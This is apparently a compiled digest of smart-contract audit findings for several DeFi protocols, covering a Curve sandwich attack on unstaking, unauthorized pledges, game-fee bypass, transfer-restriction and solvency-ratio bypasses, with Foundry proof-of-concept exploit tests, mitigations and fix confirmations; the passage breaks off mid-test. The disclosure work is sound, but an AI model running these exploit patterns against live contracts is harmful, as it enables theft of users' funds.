    // depressing the stETH/ETH rate by 4%.
    // Both get_dy and exchange now reflect the manipulated reserves.
    curvePool.setPoolManipulation(400); // 4% price depression

    // Attacker calls unstakeTokensViaAdapter (it's permissionless!)
    // Inside _wstETHToWeth:
    //   get_dy returns depressed value (manipulated reserves)
    //   minEthOut = depressed value * (1 - 0.5% tolerance) — even lower
    //   exchange executes at depressed rate — passes the check!
    bob.unstakeTokensViaAdapter(vaultId);
    uint256 sandwichWethReceived = adapter.getWethReceivedAfterUnstaking(vaultId);

    // Attacker back-runs: removes stETH from pool, profits from recovery
    curvePool.setPoolManipulation(0);

    // ====== VERIFY: sandwich reduced WETH received ======
    uint256 wethStolen = normalWethReceived - sandwichWethReceived;

    // The sandwich depressed the received WETH by ~4%
    assertGt(wethStolen, 0, "Sandwich should reduce WETH received");
    assertGt(
        wethStolen,
        (normalWethReceived * 3) / 100, // at least 3% loss
        "Loss should be significant (>3% of normal amount)"
    );

    // ====== VERIFY: slippage check did NOT protect users ======
    // The fact that unstakeTokensViaAdapter succeeded (didn't revert)
    // proves the circular slippage check passed despite 4% manipulation.
    assertGt(sandwichWethReceived, 0, "Unstaking succeeded despite manipulation");

    // ====== VERIFY: all users' redemptions are permanently affected ======
    setMsgSender(users.depositor);
    (uint128 depositorRedeem,) = bob.redeem(vaultId);

    // User should have received ~10 WETH worth (their 1/3 share),
    // but instead receives ~4% less due to the sandwich
    uint256 expectedFairShare = normalWethReceived / 3;
    uint256 actualShare = uint256(depositorRedeem);

    assertLt(actualShare, expectedFairShare, "User received less than fair share");
    uint256 userLoss = expectedFairShare - actualShare;
    assertGt(
        userLoss,
        (expectedFairShare * 3) / 100, // at least 3% loss per user
        "Per-user loss should be significant (>3%)"
    );
}
```

Run with: `forge test --match-test test_PoC_SandwichAttackOnUnstaking -vvv`

**Recommended Mitigation:** Replace the circular spot-price slippage protection with an external price reference. Options include:

1. **Use Chainlink stETH/ETH oracle for `minEthOut`**: The protocol already integrates Chainlink oracles — use a stETH/ETH feed (or derive the rate from stETH/USD and ETH/USD feeds) as the price reference instead of the manipulable Curve spot price:

```solidity
function _wstETHToWeth(uint128 wstETHAmount) private returns (uint128 wethReceived) {
    uint256 stETHAmount = IWstETH(WSTETH).unwrap(wstETHAmount);

    // Use oracle price instead of spot price for minEthOut
    uint256 oraclePrice = _getStETHToETHOraclePrice();
    uint256 fairEthOut = stETHAmount * oraclePrice / 1e18;
    uint256 minEthOut = ud(fairEthOut).mul(UNIT.sub(slippageTolerance)).unwrap();

    uint256 ethReceived = ICurveStETHPool(CURVE_POOL).exchange(1, 0, stETHAmount, minEthOut);
    // ...
}
```

2. **Allow caller to specify `minEthOut`**: Let the caller provide the minimum acceptable output computed off-chain, so they can use fair market data:

```solidity
function unstakeTokensViaAdapter(uint256 vaultId, uint256 minEthOut) external;
```

3. **Use Lido's native withdrawal queue**: Lido withdrawals process at the protocol-determined exchange rate (not a DEX spot price), eliminating the manipulation surface entirely.

**Sablier:** Fixed in commits:
* [2e0abaf](https://github.com/sablier-labs/lockup/commit/2e0abaf7b026126895443b416bd4bf3e7d6c9bea) - the Curve `get_dy` spot price reference has been replaced with a Chainlink oracle; `SablierLidoAdapter::_swapWstETHToWeth` now uses `STETH_ETH_ORACLE`
* [7fae842](https://github.com/sablier-labs/lockup/commit/7fae8429bdb2b88d4b0e63dcf25eb8a1477e5a8a) - after mitigation review, a check has been added to revert if the oracle price is zero, to avoid zero slippage swaps if the oracle is misbehaving. No other oracle-related checks were added to provide a balance between protecting the user but also allowing them to exit; we don't want their tokens to be locked forever simply because the oracle has problems.

**Cyfrin:** Verified; we note that the curve swap can execute with stale prices. This appears to be a design decision which:
* allows users to exit even if the Oracle is not behaving 100% correctly
* only reverts in the case that an unlimited slippage swap (oracle price is zero)

\clearpage

## [C-5] Attacker can make pledge on behalf of users if those users have approved `Pledge Manager` to spend their tokens
- Severity: `Critical`
- Source report: `pledge.md`

### Detailed Content (from source)
**Description:** `PledgeManager` requires users to approve it to spend their tokens in order to make pledges. Users can do this by either:
1) using `IERC20Permit::permit` which enforces a nonce for the signer, deadline and domain separator
2) manually by calling `IERC20::approve`

If users use the manual method 2) and leave an open token approval, an attacker can call `PledgeManager::pledge` to make a pledge on their behalf since this function never enforces that `msg.sender == data.signer`.

**Impact:** Attacker can make pledges on behalf of innocent users which spends those users' tokens. It is common for users to have max approvals for protocols they use often, even though they don't intend to spend all their tokens with that protocol.

**Recommended Mitigation:** In `PledgeManager::pledge`, when not using `IERC20Permit::permit` enforce that `msg.sender == data.signer`:
```diff
        if (data.usePermit) {
            IERC20Permit(stablecoin).permit(
                signer,
                address(this),
                finalStablecoinAmount,
                block.timestamp + 300,
                data.permitV,
                data.permitR,
                data.permitS
            );
        }
+       else if(msg.sender != signer) revert MsgSenderNotSigner();
```

Alternatively always use `msg.sender` similar to how `PledgeManager::refundTokens` works.

**Remora:** Fixed in commit [e3bda7c](https://github.com/remora-projects/remora-smart-contracts/commit/e3bda7c78321febb0e2f37b29912ba24c9e04343) by always using `msg.sender` and also removed the permit method.

**Cyfrin:** Verified.

## [C-6] Users can participate in an infinite number of games they haven't joined, bypassing all entry fee requirements while still becoming winners and claiming prizes
- Severity: `Critical`
- Source report: `protocol.md`

### Detailed Content (from source)
**Description:** `SessionManager::commitReaction` only checks that the user has joined `_gameId`, but doesn't verify that `_questionId` belongs to `_gameId`:
```solidity
 function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit)
        external
        onlyState(_gameId, SessionState.Ongoing)
    {
        require(contestants[_gameId][msg.sender], NotJoined(msg.sender, _gameId));
        IPromptStrategy(questionCommitment[_questionId].promptStrategy).commitReaction(
            _gameId, _questionId, _commit, msg.sender
        );
    }
```

Then in the strategy contracts `commitReaction` also doesn't validate this; it just saves the user's reaction into `reactions[_questionId][_user]` which has no associated to any `gameId`:
```solidity
 function commitReaction(uint256 _gameId, uint256 _questionId, bytes32 _commit, address _user) external {
        require(revealedAt[_questionId] != 0, QuestionNotRevealed(_questionId));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        require(
            revealedAt[_questionId] + revealedQuestions[_questionId].reactionDeadline > block.timestamp, /
            ReactionDeadlinePassed(_user, _questionId)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.baseReaction.timestamp == 0, AnswerAlreadyCommitted(_user, _gameId, _questionId));

        r.baseReaction.commit = _commit; <------
        r.baseReaction.timestamp = block.timestamp;

        emit AnswerCommitted(_gameId, _questionId, _user, _commit);
    }
```

Similarly `SessionManager::revealReactions` also doesn't check that `_questionId` is associated with `_gameId`:
```solidity
  function revealReaction(
        uint256 _gameId,
        uint256 _questionId,
        bytes calldata _selection,
        uint256 salt,
        address _user
    ) external {
        uint16 selection = abi.decode(_selection, (uint16));
        require(
            revealedQuestions[_questionId].sessionManager == msg.sender,
            OnlySessionManager(revealedQuestions[_questionId].sessionManager, msg.sender)
        );
        Reaction storage r = reactions[_questionId][_user];
        require(r.baseReaction.timestamp != 0, AnswerNotCommitted(_user, _gameId, _questionId));
        require(!r.baseReaction.revealed, AnswerAlreadyRevealed(_user, _gameId, _questionId));
        require(
            keccak256(abi.encodePacked(_gameId, _questionId, selection, salt)) == r.baseReaction.commit,
            RevealMismatch(_gameId, _questionId, selection, salt, r.baseReaction.commit)
        );

        r.answer = selection;<------
        r.baseReaction.revealed = true;<-------
        address[][] storage choiceCounter = choiceCounters[_questionId];
        uint256 choicesLength = revealedQuestions[_questionId].choices.length;
        if (choiceCounter.length == 0) {
            // set length of choiceCounter to choicesLength
            assembly {
                sstore(choiceCounter.slot, add(sload(choiceCounter.slot), choicesLength))
            }
        }
        choiceCounters[_questionId][selection].push(_user); <-------
        emit AnswerRevealed(_gameId, _questionId, _user, selection);
    }
```

**Impact:** A malicious user can permanently bypass all game entry fees by joining one game; they can even create their own game with zero `ticketPrice`, join it and then participate in an infinite number of games for free.

Such users gain a huge competitive advantage of other users since they bypass game entry fees but can still become winners and claim winnings.

**Proof of Concept:** Run this POC in `SessionManagerReactions.t.sol`
```solidity
 function test_commitReaction_anotherGame() public {
        //@audit
        _createGame();
        _startGame();

        // create and start second game
        _createGame();
        uint256 startTime = sessionManager.getStartTime(2);
        vm.warp(startTime);

        // mint and join contestants

        for (uint256 i = 1; i < contestants.length; i++) {
            //start from 1; doing joint the contestant 0 to the second game
            // mint
            contestants[i] = makeAddr(string(abi.encodePacked("contestant-", Strings.toString(i))));
            TestUSDC(usdc).mint(contestants[i], 10 ether);

            // join
            vm.startPrank(contestants[i]);
            TestUSDC(usdc).approve(address(sessionManager), 10 ether);
            sessionManager.joinGame(2);
            vm.stopPrank();
        }

        //start the game
        sessionManager.startAndRevealGameQuestion(2, 1, abi.encode(question), salt); // game2 question 1

        bytes32 commit = keccak256(abi.encodePacked("test commit"));

        vm.prank(contestants[0]);
        sessionManager.commitReaction(1, 1, commit); //contestant 0 enter in the first game not the second // passing the first game but participating in the question 1 that belong to the second game
    }
```

**Recommended Mitigation:** When users perform *all* game-related actions, validate that:
* they have actually joined the game
* their input `questionId` belongs to their input `gameId`

**Majority Games:**

Fixed in commits [62cafca](https://github.com/Engage-Protocol/engage-protocol/commit/62cafcafd1bfbdb73809d0cd01c746e3586183b9), [01d5cc2](https://github.com/Engage-Protocol/engage-protocol/commit/01d5cc27f9ce72f0666083a2e37959c61ba58649), [f0e77f9](https://github.com/Engage-Protocol/engage-protocol/commit/f0e77f97da55310d8cb8c0a04096f5d3ef480b55).

**Cyfrin:** Verified.

\clearpage
## High Risk

## [M-7] Complete bypass of transfer restrictions on vault share token is possible
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** In `AccountableVault.sol` (which is inherited by the `AccountableAsyncRedeemVault`, we have certain transfer restrictions (KYC, if from address is subject to a throttle timestamp), applied in `_checkTransfer()` function.

These restrictions are applied on `transfer()`/ `transferFrom()` function (inherited from ERC20) when share holders try to move their holdings.

These restrictions do not apply when the internal `_transfer()` function is used, which is fine for most cases as these share tokens will be moved only for deposits and redeems.

But there is one case where user can use the `cancelRedeemRequest()` feature to bypass all these restrictions completely, and move share tokens to a different address.

This is how it can be done :

- Assume controller has a deposit in the vault
- Controller places a redeem request
- Controller immediately cancels the redeem request
- Controller calls `claimCancelRedeemRequest()` where share tokens are transferred to a "receiver" address

```solidity
   function claimCancelRedeemRequest(uint256 requestId, address receiver, address controller)
        public
        onlyAuth
        returns (uint256 shares)
    {
        _checkController(controller);
        VaultState storage state = _vaultStates[controller];
        shares = state.claimableCancelRedeemRequest;
        if (shares == 0) revert ZeroAmount();

        strategy.onClaimCancelRedeemRequest(address(this), controller);

        state.claimableCancelRedeemRequest = 0;

        _transfer(address(this), receiver, shares); // @audit bypasses all transfer restrictions.

        emit CancelRedeemClaim(receiver, controller, requestId, msg.sender, shares);
    }
```

For this transfer step, the internal `_transfer()` function is used which skips all transfer restrictions applicable as per AccountableVault logic.

**Impact:** This "receiver" address input while calling `claimCancelRedeemRequest()` is the controller's choice and there are no checks on it as `_checkTransfer()` gets bypassed. This allows to transfer shares even if "to" address is not KYC-ed or transfers originating at "from" address had to work with a cooldown time.

This way controller is able to move their vault shares to a random receiver address, bypassing the transfer restrictions.

**Recommended Mitigation:** In `claimCancelRedeemRequest()`, remove the receiver address logic and just transfer the cancelled shares back to the controller address. This solves the issue as controller is already expected to be KYC-ed, and there will be no need for a cooldown check in that case as shares are going back to the original holder.

**Accountable:** Fixed in commit [`2eeb273`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/2eeb2736eb5ba8dafa2c9f2f458b31fd8eb2d6bf)

**Cyfrin:** Verified. `reciever` now checked against KYC.

## [M-8] ERC20 zero amount transfer rejection
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** The `_checkTransfer` function reverts on zero-amount transfers, violating ERC-20 standard which mandates that transfers of 0 values [MUST be treated](https://eips.ethereum.org/EIPS/eip-20#transfer) as normal transfers.

**Impact:** Violation of `eip20_transferSupportZeroAmount` and `eip20_transferFromSupportZeroAmount`.

**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/9c9c3c73f4d64f9baf1284ced4f4a8f5/?anonymousKey=160f0b0d10e3f688f1981708e4aa3819e7023a80

```solidity
// EIP20-06: Verify transfer() handles zero amount transfers correctly
// EIP-20: "Transfers of 0 values MUST be treated as normal transfers and fire the Transfer event."
rule eip20_transferSupportZeroAmount(env e, address to, uint256 amount) {

    setup(e);

    // Perform transfer
    transfer(e, to, amount);

    // Zero amount transfers must succeed
    satisfy(amount == 0);
}

// EIP20-09: Verify transferFrom() handles zero amount transfers correctly
// EIP-20: "Transfers of 0 values MUST be treated as normal transfers and fire the Transfer event."
rule eip20_transferFromSupportZeroAmount(env e, address from, address to, uint256 amount) {

    setup(e);

    // Perform the transferFrom
    transferFrom(e, from, to, amount);

    // Zero amount transferFrom must succeed
    satisfy(amount == 0);
}
```

✅ Verified after the fix: https://prover.certora.com/output/52567/0babf2c2b4da49ec87cc0ae00036b0e7/?anonymousKey=21b1c4b60901ee2fea0115aa8a1b0e621c04bfaa

**Recommended Mitigation:**
```diff
diff --git a/credit-vaults-internal/src/vault/AccountableVault.sol b/credit-vaults-internal/src/vault/AccountableVault.sol
index 629b6d0..fb3676a 100644
--- a/credit-vaults-internal/src/vault/AccountableVault.sol
+++ b/credit-vaults-internal/src/vault/AccountableVault.sol
@@ -141,7 +141,8 @@ abstract contract AccountableVault is IAccountableVault, ERC20, AccessBase {

     /// @dev Checks transfer restrictions before executing the underlying transfer
     function _checkTransfer(uint256 amount, address from, address to) private {
-        if (amount == 0) revert ZeroAmount();
+        // @certora FIX for eip20_transferSupportZeroAmount and eip20_transferFromSupportZeroAmount
+        // if (amount == 0) revert ZeroAmount();
         if (!transferableShares) revert SharesNotTransferable();
         if (!isVerified(to, msg.data)) revert Unauthorized();
         if (throttledTransfers[from] > block.timestamp) revert TransferCooldown();
```

**Accountable:** Fixed in commit [`e90d3de`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/e90d3de5c133c73f0e783d552bb4e256400a547c)

**Cyfrin:** Verified.

## [M-9] Order expiration check uses inclusive bound so order remains valid at the expiration timestamp
- Severity: `Medium`
- Source report: `clob.md`

### Detailed Content (from source)
**Description:** In `MyriadCTFExchange::_validateOrder` we require that an order is not expired before accepting it. The check is `order.expiration == 0 || order.expiration >= block.timestamp`. When `expiration` is non-zero, this treats the order as valid whenever the current time is less than or equal to `expiration`. So at the exact moment `block.timestamp == order.expiration`, the order is still valid.

The field is named `expiration`, which conventionally means the time at which the order expires, i.e. at that instant it should no longer be valid. Allowing validity at the exact expiration timestamp contradicts that meaning and can surprise integrators or users who assume "expiration" is the first moment the order is invalid.

```solidity
// MyriadCTFExchange.sol:409-410
require(order.expiration == 0 || order.expiration >= block.timestamp, "expired");
```

**Recommended Mitigation:** Require that the current time is strictly before the expiration time when `expiration` is set. Change the check to use a strict inequality:

```solidity
require(order.expiration == 0 || order.expiration > block.timestamp, "expired");
```

**Myriad:** Fixed in commit [`0d94334`](https://github.com/Polkamarkets/polkamarkets-js/pull/119/changes/0d9433408a1263abcc4e28f9514e9911a4142cb2)

**Cyfrin:** Verified.

## [M-10] JR Tranche is susceptible to bankrun scenarios given that `Shares Cooldown` finalization allows to bypass `minimum Jrt Srt Ratio` and first withdrawers from JR Tranche get a better cooldown and fees compared to late withdrawers
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** The protocol enforces a hard solvency constraint via minimumJrtSrtRatio, which is intended to guarantee that Junior Tranche (JRT) always retains a minimum buffer relative to Senior Tranche (SRT). This invariant is enforced during normal withdrawals through `Accounting.maxWithdrawInner()`. However, this protection is explicitly disabled when the share owner is the `SharesCooldown` contract (i.e call from `finalize` function):

```solidity
    function maxWithdrawInner(bool isJrt, bool ownerIsSharesCooldown) internal view returns (uint256) {
        if (ownerIsSharesCooldown) {
            return isJrt ? jrtNav : srtNav;
        }
        if (isJrt) {
            uint256 minJrt = srtNav * minimumJrtSrtRatio / 1e18;
            return Math.saturatingSub(jrtNav, minJrt);
        }
        // srt
        return srtNav;
    }
```

This creates a critical bypass. When JRT shares are moved into `SharesCooldown`, the subsequent redemption is executed with `owner = SharesCooldown`. At that point, the JRT hard-floor is no longer applied, and the protocol allows withdrawing up to the entire JRT NAV, even if doing so violates `minimumJrtSrtRatio`.

The attached PoC demonstrates this behavior: after JRT shares are locked, additional `SRT` deposits increase `srtNav`, and once `SharesCooldown.finalize()` is called, the JRT withdrawal is executed without any hard-floor enforcement, leaving the system below` minimumJrtSrtRatio`.

Leveraging the hard-floor bypass via the `SharesCooldown`, combined with the cooldown and fees charged on a withdrawal based on the current `coverage`, the system is susceptible to falling into bankrun scenarios where JR depositors rush to request a withdrawal for their deposits as a preventive measure in case the ratio continues to trend down to the hard-floor` limit. The first withdrawers will ensure they can withdraw their funds if the `hard-floor` limit is reached, and if the system starts to recover, they can cancel their withdrawal request and continue earning yield.
- This behavior is unfair for late withdrawers because, as more JR withdrawals are processed, the `coverage` increments, which causes the late withdrawers to go under higher cooldown periods and pay higher fees than the earlier withdrawers.
- The system would effectively incentivize earlier withdrawers to pull out their funds from the JR tranche while `coverage` is high, paying less fees and having a lower cooldown period.


**Impact:** All `finalize` functions allow bypassing the `minimumJrtSrtRatio` constraint when redeeming shares from `SharesCooldown`. However, `finalizeWithFee()` is the most critical vector because it enables strategic exploitation: users can lock shares during healthy coverage periods, then pay a fee to exit early and bypass the hard floor without waiting the full cooldown period. This converts `minimumJrtSrtRatio` from a protective solvency constraint into a paid bypass mechanism.

Once `jrtNav / srtNav` falls below `minimumJrtSrtRatio`:

1. SRT deposits are disabled due to minimumJrtSrtRatioBuffer.

2. Normal JRT withdrawals are blocked, effectively trapping remaining JRT liquidity.

3. Late withdrawers on JRT are penalized in the form of paying higher fees and higher cooldown periods.

**Proof of Concept:** Create a new file on `test/PoC/Cyfrin`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";

contract JrtSrtRatioViolationTest is CDOTest {

    function test_PoC() public {
        address victim = address(0x1234);
        address attacker = address(0x5678);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        SharesCooldown.TExitUpperBounds memory exitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 100000,                    // 10% (in ppm)
            p1: 150000,                   // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 1000, sharesLock: 7 days }),   // Most restrictive: 0.1% fee, 7d lock
            r1: ISharesCooldown.TExitParams({ feePpm: 500, sharesLock: 1 days }),    // Median: 0.05% fee, 1d lock
            r2: ISharesCooldown.TExitParams({ feePpm: 0, sharesLock: 0 })            // Least: 0 fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), exitBounds);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));

        uint256 victimJRTDeposit = 100 ether;
        uint256 attackerSRTDeposit = 1100 ether; // will push jrtNav:srtNav close to 0.05 minimumJrtSrtRatio

        // Victim deposits to JRT
        vm.startPrank(victim);
        USDe.mint(victim, victimJRTDeposit);
        USDe.approve(address(jrtVault), victimJRTDeposit);
        jrtVault.deposit(victimJRTDeposit, victim);
        vm.stopPrank();

        // Attacker deposits to SRT
        vm.startPrank(attacker);
        USDe.mint(attacker, attackerSRTDeposit);
        USDe.approve(address(srtVault), attackerSRTDeposit);
        srtVault.deposit(attackerSRTDeposit, attacker);
        vm.stopPrank();

        // Sanity: Get initial jrtNav and srtNav
        (uint256 jrtNavT0, uint256 srtNavT0, ) = accounting.totalAssetsT0();
        // Confirm we’re at the hard floor (i.e. jrtNav/srtNav ≈ minimumJrtSrtRatio)
        uint256 ratio = (jrtNavT0 * 1e18) / srtNavT0;
        console.log("Ratio: ", ratio);

        // victim withdraws 40 shares from JRT
        vm.startPrank(victim);
        uint256 victimWithdrawAmount = 40 ether;
        jrtVault.withdraw(victimWithdrawAmount, victim, victim);
        vm.stopPrank();

        // Current ratio is still 100/1100 since TVL doesnt decrease

        // Attacker deposits additional 900 ether to SRT vault
        uint256 additionalSRTDeposit = 565 ether;
        vm.startPrank(attacker);
        USDe.mint(attacker, additionalSRTDeposit);
        USDe.approve(address(srtVault), additionalSRTDeposit);
        srtVault.deposit(additionalSRTDeposit, attacker);
        vm.stopPrank();

        vm.warp(block.timestamp + 8 days);

        vm.startPrank(victim);
        sharesCooldown.finalize(jrtVault, address(USDe), victim);
        vm.stopPrank();

        (jrtNavT0, srtNavT0, ) = accounting.totalAssetsT0();
        ratio = (jrtNavT0 * 1e18) / srtNavT0;
        console.log("Ratio after JRT withdrawal finalized: ", ratio);
        assertLt(ratio, 0.05e18, "Ratio is not below minimum required 5%");
    }
}
```

**Recommended Mitigation:** Modify finalizeWithFee() to enforce the minimumJrtSrtRatio constraint during early exits, preventing users from bypassing the hard floor by paying a fee.

Also, consider changing the system mechanism to disincentivize withdrawals from the JRT as much as possible and instead, incentivize depositors to not withdraw their funds. This objective can be achieved by:
- higher cooldown and fees when the `coverage` is high
- lower cooldown and fees when the `coverage` is low
The goal is to disincentivize first withdrawers (when `coverage` is high) from withdrawing by charging them a higher fee than later withdrawers, since late withdrawers face a higher risk of supporting the SR deposits.


**Strata:** Fixed in commit [1feb125](https://github.com/Strata-Money/contracts-tranches/commit/1feb125bd8028d9d8ae2a0034f5cf831c82649e6).

**Cyfrin:** Verified. Instant finalizations revert when the shares to be redeemed exceed the maximum redeemable shares on the underlying Tranche; The maximum redeemable shares account for the `minimumJrtSrtRatio` on the JRT.

## [M-11] Gas optimization for `get Vaults` function
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `MiddlewareVaultManager::getVaults` uses an inefficient pattern that iterates through the entire list of vaults twice. The first iteration counts the number of active vaults, while the second iteration builds the array of active vaults.

This implementation:

- Makes the same `vaults.atWithTimes(i)` calls twice
- Performs the same `_wasActiveAt()` calculation twice for each vault
- Results in unnecessary gas consumption, especially as the number of vaults grows

**Recommended Mitigation:** Consider refactoring the function to use a single-pass approach that eliminates the redundant iteration by caching the active vaults in the first loop.

```diff solidity
function getVaults(
    uint48 epoch
) external view returns (address[] memory) {
    uint256 vaultCount = vaults.length();
    uint48 epochStart = middleware.getEpochStartTs(epoch);

    // Early return for empty vaults
    if (vaultCount == 0) {
        return new address[](0);
    }

++    address[] memory tempVaults = new address[](vaultCount);
    uint256 activeCount = 0;

    // Single pass through the vaults
    for (uint256 i = 0; i < vaultCount; i++) {
        (address vault, uint48 enabledTime, uint48 disabledTime) = vaults.atWithTimes(i);
        if (_wasActiveAt(enabledTime, disabledTime, epochStart)) {
++          tempVaults[activeCount] = vault;
            activeCount++;
        }
    }

    // Create the final result array with correct size
    address[] memory activeVaults = new address[](activeCount);
-- uint256 activeIndex = 0;
-- for (uint256 i = 0; i < vaultCount; i++) {
--      (address vault, uint48 enabledTime, uint48 disabledTime) = vaults.atWithTimes(i);
--      if (_wasActiveAt(enabledTime, disabledTime, epochStart)) {
--          activeVaults[activeIndex] = vault;
--          activeIndex++;
--       }
--    }
++    for (uint256 i = 0; i < activeCount; i++) {
++       activeVaults[i] = tempVaults[i];
++    }

    return activeVaults;
}
```

**Suzaku:**
Fixed in commit [59a0109](https://github.com/suzaku-network/suzaku-core/commit/59a01095a1940aae4e75a87580695ca3e4d99712).

**Cyfrin:** Verified.

## [M-12] Historical reward loss due to `Node Id` reuse in `Avalanche L1Middleware`
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware` contract is vulnerable to misattributing stake to a former operator (Operator A) if a new, colluding or coordinated operator (Operator B) intentionally re-registers a node using the *exact same `bytes32 nodeId`* that Operator A previously used. This scenario assumes Operator B is aware of Operator A's historical `nodeId` and that the underlying P-Chain NodeID (`P_X`, derived from the shared `bytes32 nodeId`) has become available for re-registration on the L1 `BalancerValidatorManager` after Operator A's node was fully decommissioned.

The issue stems from the `getActiveNodesForEpoch` function, which is utilized by `getOperatorUsedStakeCachedPerEpoch` for stake calculations. This function iterates through Operator A's historical `nodeId`s (stored permanently in `operatorNodes[A]`). When it processes the reused `bytes32 nodeId_X`, it converts it to its P-Chain NodeID format (`P_X`). It then queries `balancerValidatorManager.registeredValidators(P_X)` to get the current L1 `validationID`. Because Operator B has now re-registered `P_X` on L1, this query returns Operator B's new `validationID_B2`.

Subsequently, `getActiveNodesForEpoch` checks if the L1 validator instance `validationID_B2` (Operator B's node) was active during the queried epoch. If true, the stake associated with `validationID_B2` (which is Operator B's stake, read from `nodeStakeCache`) is incorrectly included in Operator A's "used stake" calculation for that epoch.

**Impact:**
- Operator A's "used stake" is artificially increased by Operator B's stake due to the malicious or coordinated reuse of `nodeId_X`. This can make Operator A appear to have more active collateral than they genuinely do during the epoch in question.
- Operator A may unjustly receive rewards that should have been attributed based on Operator B's capital and operational efforts, leading to a direct misallocation in rewards.

**Proof of Concept:**
1.  **Epoch E0:** Operator A registers node `N1` using `bytes32 nodeId_X`. This registration is processed by `BalancerValidatorManager`, resulting in L1 `validationID_A1` associated with the P-Chain NodeID `P_X` (derived from `nodeId_X`). Operator A has `stake_A`. `nodeId_X` is permanently recorded in `operatorNodes[A]`.
2.  **Epoch E1:** Node `N1` (`validationID_A1`) is fully removed from `BalancerValidatorManager`. The P-Chain NodeID `P_X` becomes available for a new L1 registration. `nodeId_X` remains in Operator A's historical record (`operatorNodes[A]`).
3.  **Epoch E2:**
    *   Operator B, in coordination with or having knowledge of Operator A's prior use of `nodeId_X` and the availability of `P_X` on L1, calls `AvalancheL1Middleware.addNode()` providing the *exact same `bytes32 nodeId_X`*.
    *   Operator B provides their own valid BLS key. Their node software uses its own valid TLS key that allows it to be associated with the P-Chain NodeID `P_X` during L1 registration (assuming `BalancerValidatorManager` either uses the input `P_X` as the primary identifier or that Operator B's TLS key happens to also correspond to `P_X` if strict matching is done).
    *   `BalancerValidatorManager` successfully registers this new L1 instance for P-Chain NodeID `P_X`, assigning it a new L1 `validationID_B2`. Operator B stakes `stake_B`. `nodeId_X` is now also recorded in `operatorNodes[B]`.
4.  **Querying for Operator A's Stake in Epoch E2:**
    *   A call is made to `l1Middleware.getOperatorUsedStakeCachedPerEpoch(E2, A, PRIMARY_ASSET_CLASS)`.
    *   `getActiveNodesForEpoch(A, E2)` is invoked. It finds the historical `nodeId_X` in `operatorNodes[A]`.
    *   It converts `nodeId_X` to `P_X`.
    *   The call `balancerValidatorManager.registeredValidators(P_X)` now returns `validationID_B2` (Operator B's currently active L1 instance for `P_X`).
    *   The function proceeds to use `validationID_B2` to fetch L1 validator details and then `nodeStakeCache[E2][validationID_B2]` to get the stake.
    *   **Result:** `stake_B` (Operator B's stake) is erroneously added to Operator A's total "used stake" for Epoch E2.

The following coded PoC can be run with the `AvalancheL1MiddlewareTest`'s setup:
```solidity
    function test_POC_MisattributedStake_NodeIdReused() public {
        console2.log("--- POC: Misattributed Stake due to NodeID Reuse ---");

        address operatorA = alice;
        address operatorB = charlie; // Using charlie as Operator B

        // Use a specific, predictable nodeId for the test
        bytes32 sharedNodeId_X = keccak256(abi.encodePacked("REUSED_NODE_ID_XYZ"));
        bytes memory blsKey_A = hex"A1A1A1";
        bytes memory blsKey_B = hex"B2B2B2"; // Operator B uses a different BLS key
        uint64 registrationExpiry = uint64(block.timestamp + 2 days);
        address[] memory ownerArr = new address[](1);
        ownerArr[0] = operatorA; // For simplicity, operator owns the PChainOwner
        PChainOwner memory pchainOwner_A = PChainOwner({threshold: 1, addresses: ownerArr});
        ownerArr[0] = operatorB;
        PChainOwner memory pchainOwner_B = PChainOwner({threshold: 1, addresses: ownerArr});


        // Ensure operators have some stake in the vault
        uint256 stakeAmountOpA = 20_000_000_000_000; // e.g., 20k tokens
        uint256 stakeAmountOpB = 30_000_000_000_000; // e.g., 30k tokens

        // Operator A deposits and sets shares
        collateral.transfer(staker, stakeAmountOpA);
        vm.startPrank(staker);
        collateral.approve(address(vault), stakeAmountOpA);
        (,uint256 sharesA) = vault.deposit(operatorA, stakeAmountOpA);
        vm.stopPrank();
        _setOperatorL1Shares(bob, validatorManagerAddress, assetClassId, operatorA, sharesA, delegator);

        // Operator B deposits and sets shares (can use the same vault or a different one)
        collateral.transfer(staker, stakeAmountOpB);
        vm.startPrank(staker);
        collateral.approve(address(vault), stakeAmountOpB);
        (,uint256 sharesB) = vault.deposit(operatorB, stakeAmountOpB);
        vm.stopPrank();
